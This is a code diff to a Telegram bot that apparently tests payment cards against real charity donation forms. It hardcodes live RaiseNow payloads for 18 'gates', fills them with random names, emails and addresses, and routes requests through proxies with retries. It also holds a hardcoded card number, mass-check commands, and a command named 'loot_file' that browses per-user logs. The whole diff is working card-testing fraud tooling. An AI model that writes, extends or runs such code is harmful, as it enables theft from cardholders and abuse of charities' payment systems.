+            payment_payload = {"account_uuid": "aa5124b6-2912-4ba1-b8ce-f43915685214", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": charge_value}, "supporter": {"locale": "en", "first_name": random_first_name, "last_name": random_last_name, "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}}, "raisenow_parameters": {"analytics": {"channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[5000,10000,15000]", "user_agent": user_agent}, "solution": {"uuid": "d2c90617-8e65-4447-a5c3-c2975b1716c2", "name": "Campagne de dons mindsUP", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/fxdnk?lng=en", "uuid": "self-service", "version": "2.16.0"}, "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "mindsup", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes, "expiry_year": ano_full, "transaction_id": transaction_id}, "profile": "eccfaccc-7730-4875-8aed-c8b2535ecc28", "return_url": "https://donate.raisenow.io/fxdnk?lng=en&rnw-view=payment_result"}
+        elif gate_id == '7':
+            payment_url = "https://api.raisenow.io/payment-sources"
+            payment_payload = {"account_uuid": "ed99e982-2f16-4643-be9d-9b31a66c3edf", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": charge_value}, "supporter": {"locale": "de", "first_name": random_first_name, "last_name": random_last_name, "email": "minhnhat4417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}}, "raisenow_parameters": {"analytics": {"channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[5000,12500,25000]", "user_agent": user_agent}, "solution": {"uuid": "09f67512-414e-4a70-ac58-08b999c47007", "name": "Spendenformular Blindenmuseum", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/dbhrx?lng=de", "uuid": "self-service", "version": "2.16.0"}, "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes, "expiry_year": ano_full, "transaction_id": transaction_id}, "profile": "5acd9b09-387a-4a89-a090-13b16c4a0032", "return_url": "https://donate.raisenow.io/dbhrx?lng=de&rnw-view=payment_result"}
+        elif gate_id == '8':
+            mode = get_gate8_mode()
+            payment_url = "https://api.raisenow.io/payments" if mode == 'charge' else "https://api.raisenow.io/payment-sources"
+            payment_payload = {"account_uuid": "ca1e7e48-d2ed-4d3c-aa7e-df7e93582adf", "test_mode": False, "create_supporter": False, "amount": {"currency": "EUR", "value": charge_value}, "supporter": {"locale": "de", "first_name": random_first_name, "last_name": random_last_name, "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}}, "raisenow_parameters": {"analytics": {"channel": "paylink", "suggested_amounts": [], "user_agent": user_agent}, "solution": {"uuid": "e0c23079-8884-47ea-b529-1dda7b164400", "name": "Trauerspenden", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/mpnfg?lng=de", "uuid": "self-service", "version": "2.16.0"}, "integration": {"message": "efwwef"}}, "custom_parameters": {"campaign_id": "trauerspende", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes, "expiry_year": ano_full, "transaction_id": transaction_id}, "profile": "15e9c847-fead-46e8-ab17-45c23a8ca9d4", "return_url": "https://donate.raisenow.io/mpnfg?lng=de&rnw-view=payment_result"}
+        elif gate_id == '9':
+            mode = get_gate9_mode()
+            payment_url = "https://api.raisenow.io/payments" if mode == 'charge' else "https://api.raisenow.io/payment-sources"
+            payment_payload = {"account_uuid": "8376b96a-a35c-4c30-a9ed-cf298f57cdc5", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": charge_value}, "supporter": {"locale": "en", "first_name": random_first_name, "last_name": random_last_name, "raisenow_parameters": {"analytics": {"channel": "paylink", "preselected_amount": 2000, "suggested_amounts": [2000, 5000, 10000], "user_agent": user_agent}}}, "solution": {"uuid": "7edeeaf-3394-45d5-b9e8-04fba87af7f7", "name": "Lippuner Scholarship", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/jgcnt?lng=en", "uuid": "self-service", "version": "2.16.0", "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes, "expiry_year": ano_full, "transaction_id": transaction_id}, "profile": "de7a9ccb-9e5b-4267-b2dc-5d406ee9a3d0", "return_url": "https://donate.raisenow.io/jgcnt?lng=en&rnw-view=payment_result"}
+        elif gate_id == '10':
+            mode = get_gate10_mode()
+            payment_url = "https://api.raisenow.io/payments" if mode == 'charge' else "https://api.raisenow.io/payment-sources"
+            payment_payload = {"account_uuid": "377e94dd-0b4d-408e-9e68-5f6f3f1a0454","test_mode": False,"create_supporter": False,"amount": {"currency": "EUR","value": charge_value},"supporter": {"locale": "en","first_name": random_first_name,"last_name": random_last_name,"email": random_email()},"raisenow_parameters": {"analytics": {"channel": "paylink","preselected_amount": "5000","suggested_amounts": "[5000,8000,10000]","user_agent": user_agent},"solution": {"uuid": "91d8bd88-a1f2-48eb-b089-23d8f08dcfb3","name": "Patenschaft","type": "donate"},"product": {"name": "tamaro","source_url": "https://donate.raisenow.io/hpgqq?lng=en","uuid": "self-service","version": "2.16.0"},"integration": {"donation_receipt_requested": "false","message": generate_random_string(15)}},"custom_parameters": {"campaign_id": "","campaign_subid": "","rnw_recurring_interval_name": "monthly","rnw_recurring_interval_text": "Monthly"},"payment_information": {"brand_code": "eca","cardholder": random_cardholder,"expiry_month": mes,"expiry_year": ano_full,"transaction_id": transaction_id},"profile": "7307173a-2047-42b4-907a-7097ac083e90","return_url": "https://donate.raisenow.io/hpgqq?lng=en&rnw-view=payment_result","subscription": {"custom_parameters": {"campaign_id": "","campaign_subid": "","rnw_recurring_interval_name": "monthly","rnw_recurring_interval_text": "Monthly"},"raisenow_parameters": {"analytics": {"channel": "paylink","preselected_amount": "5000","suggested_amounts": "[5000,8000,10000]","user_agent": user_agent},"solution": {"uuid": "91d8bd88-a1f2-48eb-b089-23d8f08dcfb3","name": "Patenschaft","type": "donate"},"product": {"name": "tamaro","source_url": "https://donate.raisenow.io/hpgqq?lng=en","uuid": "self-service","version": "2.16.0"},"integration": {"donation_receipt_requested": "false","message": generate_random_string(15)}},"recurring_interval": "7 * *","timezone": "Asia/Bangkok"}}
+        elif gate_id == '11':
+            from checkers.gate11_checker import COUNTRY_CODES
+            mode = get_gate11_mode()
+            payment_url = "https://api.raisenow.io/payments" if mode == 'charge' else "https://api.raisenow.io/payment-sources"
+            payment_payload = {"account_uuid": "dc82362f-b3ba-4581-87e8-79f49eda26a9","test_mode": False,"create_supporter": False,"amount": {"currency": "CHF","value": charge_value},"supporter": {"locale": "en","salutation": "ms","first_name": random_first_name,"last_name": random_last_name,"email": random_email(),"email_permission": False,"raisenow_parameters": {"integration": {"opt_in": {"email": False}}},"street": generate_random_string(28),"postal_code": str(random.randint(10000,99999)),"city": generate_random_string(22),"country": random.choice(COUNTRY_CODES)},"raisenow_parameters": {"analytics": {"channel": "paylink","preselected_amount": "2000","suggested_amounts": "[2000,5000,10000]","user_agent": user_agent},"solution": {"uuid": "c60204c5-2c1b-47a2-ad3a-d852842eae1e","name": "Page don - Site internet","type": "donate"},"product": {"name": "tamaro","source_url": "https://donate.raisenow.io/nptfc?lng=en","uuid": "self-service","version": "2.16.0"},"integration": {"message": generate_random_string(15)}},"custom_parameters": {"campaign_id": "Page donation - Website","campaign_subid": ""},"payment_information": {"brand_code": "eca","cardholder": random_cardholder,"expiry_month": mes,"expiry_year": ano_full,"transaction_id": transaction_id},"profile": "3da0f136-93dd-496d-a1db-688d7708259e","return_url": "https://donate.raisenow.io/nptfc?lng=en&rnw-view=payment_result"}
+        elif gate_id == '12':
+            mode = get_gate12_mode()
+            payment_url = "https://api.raisenow.io/payments" if mode == 'charge' else "https://api.raisenow.io/payment-sources"
+            payment_payload = {"account_uuid": "28846c84-f223-4e0f-98d3-1bbb2759ca18","test_mode": False,"create_supporter": False,"amount": {"currency": "EUR", "value": charge_value},"supporter": {"locale": "en", "first_name": random_first_name,"last_name": random_last_name,"email": random_email(),"email_permission": True,"raisenow_parameters": {"integration": {"opt_in": {"email": True}}}},"raisenow_parameters": {"analytics": {"channel": "paylink","preselected_amount": "75000","suggested_amounts": "[75000]","user_agent": user_agent},"solution": {"uuid": "26acf3f7-5be6-48bd-962e-f50a5de77eff","name": "Berlin Marathon - Runner","type": "donate"},"product": {"name": "tamaro","source_url": "https://donate.raisenow.io/qsjvv?lng=en","uuid": "self-service","version": "2.16.0"}},"custom_parameters": {"campaign_id": "rn-bm-2025","campaign_subid": ""},"payment_information": {"brand_code": "amx","cardholder": random_cardholder,"expiry_month": mes,"expiry_year": ano_full,"transaction_id": transaction_id},"profile": "8bb14581-041e-4625-b9a9-4a9a2c283515","return_url": "https://donate.raisenow.io/qsjvv?lng=en&rnw-view=payment_result"}
+        elif gate_id == '13':
+            mode = get_gate13_mode()
+            payment_url = "https://api.raisenow.io/payments" if mode == 'charge' else "https://api.raisenow.io/payment-sources"
+            payment_payload = {
+                "account_uuid": "badda322-5bcf-42a0-b48f-65309d12ad64", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": charge_value},
+                "supporter": {"locale": "fr", "first_name": random_first_name, "last_name": random_last_name},
+                "raisenow_parameters": {"analytics": {"channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[5000,10000,15000]", "user_agent": user_agent}, "solution": {"uuid": "2d4777ad-c6d8-468b-840b-db29de3990ed", "name": "Fundraising", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/kmmjt?lng=fr", "uuid": "self-service", "version": "2.16.0"}, "integration": {"donation_receipt_requested": "false"}},
+                "custom_parameters": {"campaign_id": "Fundraising", "campaign_subid": "Spenden"},
+                "payment_information": {"brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes.zfill(2), "expiry_year": ano_full, "transaction_id": transaction_id},
+                "profile": "4c12f4a1-45f6-407c-a567-1dbf55a21cdc",
+                "return_url": "https://donate.raisenow.io/kmmjt?lng=fr&rnw-view=payment_result"
+            }
+        elif gate_id == '14':
+            mode = get_gate14_mode()
+            payment_url = "https://api.raisenow.io/payments" if mode == 'charge' else "https://api.raisenow.io/payment-sources"
+            payment_payload = {
+                "account_uuid": "ae1391d9-74f1-4109-84b9-7248ee5604ea", "test_mode": False, "create_supporter": False, "amount": {"currency": "EUR", "value": charge_value},
+                "supporter": {"locale": "en", "first_name": random_first_name, "last_name": random_last_name},
+                "raisenow_parameters": {"analytics": {"channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[5000,10000]", "user_agent": user_agent}, "solution": {"uuid": "0727c95e-5d1c-4d95-a91f-6a7f676d58c7", "name": "Spenden", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/bmqkg?lng=en", "uuid": "self-service", "version": "2.16.0"}, "integration": {"donation_receipt_requested": "false"}},
+                "custom_parameters": {"campaign_id": "", "campaign_subid": ""},
+                "payment_information": {"brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes.zfill(2), "expiry_year": ano_full, "transaction_id": transaction_id},
+                "profile": "d4569598-edce-4081-a911-38a3babeb848",
+                "return_url": "https://donate.raisenow.io/bmqkg?lng=en&rnw-view=payment_result"
+            }
+        elif gate_id == '15':
+            mode = get_gate15_mode()
+            payment_url = "https://api.raisenow.io/payments" if mode == 'charge' else "https://api.raisenow.io/payment-sources"
+            payment_payload = {
+                "account_uuid": "8376b96a-a35c-4c30-a9ed-cf298f57cdc5", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": charge_value},
+                "supporter": {"locale": "en", "first_name": random_first_name, "last_name": random_last_name},
+                "raisenow_parameters": {"analytics": {"channel": "paylink", "preselected_amount": "2000", "suggested_amounts": "[2000,5000,10000]", "user_agent": user_agent}, "solution": {"uuid": "71495e3c-bfd6-4457-8822-b1998160b425", "name": "UN Youth Scholarship", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/tqvcj?lng=en", "uuid": "self-service", "version": "2.16.0"}, "integration": {"donation_receipt_requested": "false"}},
+                "custom_parameters": {"campaign_id": "", "campaign_subid": ""},
+                "payment_information": {"brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes.zfill(2), "expiry_year": ano_full, "transaction_id": transaction_id},
+                "profile": "de7a9ccb-9e5b-4267-b2dc-5d406ee9a3d0",
+                "return_url": "https://donate.raisenow.io/tqvcj?lng=en&rnw-view=payment_result"
+            }
+        elif gate_id == '16':
+            mode = get_gate16_mode()
+            payment_url = "https://api.raisenow.io/payments" if mode == 'charge' else "https://api.raisenow.io/payment-sources"
+            payment_payload = {
+                "account_uuid": "a1762b84-a8ed-4a78-a15b-f9b1a5ee54f6", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": charge_value},
+                "supporter": {"locale": "fr", "salutation": "ms", "first_name": random_first_name, "last_name": random_last_name, "email": random_email()},
+                "raisenow_parameters": {"analytics": {"channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[5000,7500,15000]", "user_agent": user_agent}, "solution": {"uuid": "6089e361-f488-498d-9fb1-a4ace4560b5d", "name": "Campagne Sindomestico", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/yjkhv?lng=fr", "uuid": "self-service", "version": "2.16.0"}, "integration": {"donation_receipt_requested": "false"}},
+                "custom_parameters": {"campaign_id": "Campagne Sindomestico", "campaign_subid": "E-CH/Sindomestico"},
+                "payment_information": {"brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes.zfill(2), "expiry_year": ano_full, "transaction_id": transaction_id},
+                "profile": "170e5c26-9289-4d1f-abc2-ae83d1a66b5a", "return_url": "https://donate.raisenow.io/yjkhv?lng=fr&rnw-view=payment_result"
+            }
+        elif gate_id == '17':
+            mode = get_gate17_mode()
+            payment_url = "https://api.raisenow.io/payments" if mode == 'charge' else "https://api.raisenow.io/payment-sources"
+            payment_payload = {
+                "account_uuid": "ed1fc07e-b12f-4b0b-a8f7-633a8275654f", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": charge_value},
+                "supporter": {"locale": "en", "first_name": random_first_name, "last_name": random_last_name, "email": random_email()},
+                "raisenow_parameters": {"analytics": {"channel": "paylink", "preselected_amount": "2000", "suggested_amounts": "[2000,5000,8000]", "user_agent": user_agent}, "solution": {"uuid": "ac2a4891-74aa-4dd1-adaf-3f385223bf99", "name": "Ndihmo LAPSH Shkolla Shqipe Gjenevë", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/dzhtf?lng=en", "uuid": "self-service", "version": "2.16.0"}, "integration": {"donation_receipt_requested": "false"}},
+                "custom_parameters": {"campaign_id": "DON-SQ", "campaign_subid": "", "rnw_recurring_interval_name": "monthly", "rnw_recurring_interval_text": "Monthly"},
+                "payment_information": {"brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes.zfill(2), "expiry_year": ano_full, "transaction_id": transaction_id},
+                "profile": "5fac9835-7372-49bb-9b51-630aeadc5bc9", "return_url": "https://donate.raisenow.io/dzhtf?lng=en&rnw-view=payment_result",
+                "subscription": {"recurring_interval": "9 * *", "timezone": "Asia/Bangkok"}
+            }
+        elif gate_id == '18':
+            mode = get_gate18_mode()
+            payment_url = "https://api.raisenow.io/payments" if mode == 'charge' else "https://api.raisenow.io/payment-sources"
+            payment_payload = {
+                "account_uuid": "14bd66de-7d3a-4d31-98cd-072193050b5f", "test_mode": False, "create_supporter": False,
+                "supporter": {"locale": "de", "salutation": "mr", "first_name": random_first_name, "last_name": random_last_name, "email": random_email()},
+                "raisenow_parameters": {"analytics": {"channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[5000,10000,15000]", "user_agent": user_agent}, "solution": {"uuid": "fc42c2dd-c128-4f9e-bc99-fb0bbda90355", "name": "Spenden Sie für hilfsbedürftige Kinder in Deutschland", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/rznkh?lng=de", "uuid": "self-service", "version": "2.16.0"}, "integration": {"donation_receipt_requested": "false"}},
+                "custom_parameters": {"campaign_id": "Spenden Sie für hilfsbedürftige Kinder in Deutschland", "campaign_subid": ""},
+                "payment_information": {"brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes.zfill(2), "expiry_year": ano_full, "transaction_id": transaction_id},
+                "profile": "30b982d3-d984-4ed7-bd0d-c23197edfd1c", "return_url": "https://donate.raisenow.io/rznkh?lng=de&rnw-view=payment_result"
+            }
+
+
+        payment_headers = {"Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": user_agent}
+        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, max_retries=2)
+
+        if error:
+            second_request_response = f"Error: {error}"
+            overall_status = "Check Error 🔴"
+        elif not payment_response:
+            second_request_response = "HTTP Error with no response"
+            overall_status = "Offline 🔴"
+        else:
+            second_request_response = payment_response.text
+            if '{"message":"Forbidden"}' in second_request_response: overall_status = "Offline 🔴"
+            else: overall_status = "Active 🟢"
+    except Exception as e:
+        second_request_response = f"System Error: {e}"
+        overall_status = "Check Error 🔴"
+
+    return overall_status, transaction_id_info, second_request_response
+
+
 async def _status_command_worker(update, context):
     """Worker function for the /status command."""
     if update.effective_user.id != ADMIN_ID: return
@@ -2698,10 +2889,68 @@ async def _status_command_worker(update, context):
     stop_typing_event = asyncio.Event()
     typing_task = asyncio.create_task(_send_typing_periodically(context, update.effective_chat.id, stop_typing_event))
     
-    # This command is for single gates, not multi-gate configs
-    await msg.edit_text("This command is for single-gate mode. Use `/checkstatusmulti` for multi-gate configs.")
-    stop_typing_event.set()
-    await typing_task
+    test_card = "5196032172122570|4|28|766" # A generic test card
+
+    gate_ids = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18']
+    
+    try:
+        with ThreadPoolExecutor(max_workers=len(gate_ids)) as executor:
+            future_to_gate = {executor.submit(_perform_gate_check, gid, test_card): gid for gid in gate_ids}
+            results = {}
+            for future in as_completed(future_to_gate):
+                gid = future_to_gate[future]
+                try:
+                    status, transaction_id_info, response = future.result()
+                    results[gid] = (status, transaction_id_info, response)
+                except Exception as e:
+                    results[gid] = ("Check Error 🔴", "N/A", str(e))
+
+        summary_message = "📊 **PAYMENT GATEWAY STATUS** 📊\n\n"
+        detailed_report = "📊 **DETAILED PAYMENT GATEWAY STATUS** 📊\n\n"
+
+        for gid in sorted(results.keys(), key=lambda x: int(x)):
+            status, transaction_id_info, response = results.get(gid, ("Unknown", "N/A", "No result"))
+            
+            gate_name_full = get_formatted_gate_name(gid)
+            
+            # Build summary message
+            summary_message += f"**Gate {gid}:** {status}\n"
+
+            # Build detailed report
+            try:
+                parsed_json = json.loads(response)
+                response_display = json.dumps(parsed_json, indent=2)
+            except (json.JSONDecodeError, TypeError):
+                response_display = str(response)
+
+            detailed_report += (
+                f"**{gate_name_full}**\n"
+                f"**Status:** {status}\n"
+                f"**Request 1 (Tokenize):** `transactionId: {transaction_id_info}`\n"
+                f"**Request 2 Response:**\n```json\n{response_display}\n```\n"
+                f"----------------------------------------\n"
+            )
+        
+        # Send the summary message, and if the detailed one is too long, send as a file.
+        await msg.edit_text(summary_message)
+        if len(detailed_report) > 4096:
+            with io.BytesIO(detailed_report.encode('utf-8')) as file_to_send:
+                await context.bot.send_document(
+                    chat_id=update.effective_chat.id,
+                    document=file_to_send,
+                    filename="gate_status_details.txt",
+                    caption="Full detailed report."
+                )
+        else:
+            await update.message.reply_text(detailed_report)
+            
+    except Exception as e:
+        logger.error(f"Error in status command: {e}")
+        await msg.edit_text("An error occurred while displaying the status.")
+    finally:
+        stop_typing_event.set()
+        await typing_task
+
 
 async def status_command(update, context):
     """(Tasked) Checks the operational status of the payment gateways."""
@@ -2940,7 +3189,7 @@ async def unltistatus_command(update, context):
         # Using escape_markdown(..., version=2) for proper formatting
         message = f"📊 *MULTI-GATE SYSTEM STATUS*\n\n"
         message += f"*- Total Gates Configured:* `{len(all_gates)}`\n"
-        message += f"*- Currently Banned Gates (session-only):* `{len(banned_gates)}`\n\n"
+        message += f"*- Currently Banned Gates:* `{len(banned_gates)}`\n\n"
         
         if not all_gates:
             message += "No gates found in `gate_configurations.py`."
@@ -3155,6 +3404,7 @@ async def loot_file_command(update, context):
     await update.message.reply_text(f"Select an option for user `{target_user_id}`:", reply_markup=reply_markup)
 
 # --- NEW: /checkstatusmulti COMMAND ---
+# --- NEW: /checkstatusmulti COMMAND ---
 async def _check_status_multi_worker(update, context):
     """Worker function for the /checkstatusmulti command."""
     if update.effective_user.id != ADMIN_ID: return
@@ -3179,6 +3429,7 @@ async def _check_status_multi_worker(update, context):
         all_gate_names = list(gate_configs.keys())
         results = {}
         
+        # --- MODIFIED: Added retry logic for connection errors ---
         def check_single_gate(gate_name):
             session = requests.Session()
             
@@ -3189,14 +3440,37 @@ async def _check_status_multi_worker(update, context):
                     proxy_dict = _format_proxy_for_requests(proxy_str)
                     if proxy_dict:
                         session.proxies = proxy_dict
+                        logger.info(f"checkstatusmulti for gate '{gate_name}' is using proxy.")
                 except IndexError:
+                    logger.warning(f"Proxy is enabled for checkstatusmulti, but the list is empty.")
                     pass
             
             gate_config = gate_configs[gate_name]
             
-            status, _, response, _ = _perform_single_request(
-                session, test_card_line, cc, mes, ano, cvv, {}, None, 'live', 50, gate_name, gate_config
-            )
+            # --- NEW: RETRY LOGIC IMPLEMENTED HERE ---
+            max_retries = 3
+            for attempt in range(max_retries):
+                status, _, response, _ = check_card_multi_generic(
+                    session, test_card_line, cc, mes, ano, cvv, {}, None, 'live', 50, gate_name, gate_config
+                )
+
+                # Check if the error is a type that we should retry
+                is_retryable_error = (
+                    status == 'error' and 
+                    response and 
+                    ("HTTP Error" in str(response) or "Connection Error" in str(response) or "Proxy Error" in str(response))
+                )
+
+                # If it's a retryable error and not the last attempt, then continue to the next loop
+                if is_retryable_error and attempt < max_retries - 1:
+                    logger.warning(f"Gate '{gate_name}' status check failed (Attempt {attempt + 1}/{max_retries}): {response}. Retrying...")
+                    time.sleep(1)  # Wait for 1 second before retrying
+                    continue
+                else:
+                    # If it's not a retryable error, or if it's the last attempt, break the loop
+                    break
+            # --- END RETRY LOGIC ---
+
             return gate_name, status, response
 
         with ThreadPoolExecutor(max_workers=min(10, len(all_gate_names))) as executor:
@@ -3215,9 +3489,11 @@ async def _check_status_multi_worker(update, context):
             status, response = results[gate_name]
             status_icon = "❔ UNKNOWN"
 
-            if status == 'gate_dead' or (status == 'error' and "Connection Error" in str(response)):
+            if status == 'gate_dead':
                 status_icon = "🔴 DEAD"
-            elif status in ['live_success', 'success', 'custom', 'decline']:
+            elif status == 'error' and (not response or "HTTP Error" in str(response) or "Connection Error" in str(response) or "Proxy Error" in str(response)):
+                status_icon = "🔴 DEAD"
+            elif response:
                 status_icon = "✅ LIVE"
             
             summary_message += f"**{escape_markdown(gate_name, version=2)}:** {status_icon}\n"
@@ -3303,10 +3579,6 @@ async def callback_query_handler(update, context):
         action, target_user_id_str = parts[1], parts[2]
         user_log_dir = os.path.join(LOG_DIR, target_user_id_str)
         
-        if not os.path.exists(user_log_dir):
-            await query.edit_message_text(f"No log directory found for user `{target_user_id_str}`.")
-            return
-
         all_sessions = sorted([d for d in os.listdir(user_log_dir) if os.path.isdir(os.path.join(user_log_dir, d))], reverse=True)
         if not all_sessions: await query.edit_message_text("No sessions found."); return
 
@@ -3648,8 +3920,9 @@ def main():
     application.add_handler(CommandHandler("multi", multi_check_command))
     application.add_handler(MessageHandler(filters.Document.ALL & filters.CaptionRegex(r'/mass(\d*)'), mass_check_handler))
     application.add_handler(CommandHandler("stop", stop_command))
-    # application.add_handler(CommandHandler("site", original_site_command))
-    # application.add_handler(CommandHandler("sitem", original_sitem_command))
+    # --- Website Checker ---
+    application.add_handler(CommandHandler("site", original_site_command))
+    application.add_handler(CommandHandler("sitem", original_sitem_command))
 
 
     # --- Admin Commands ---
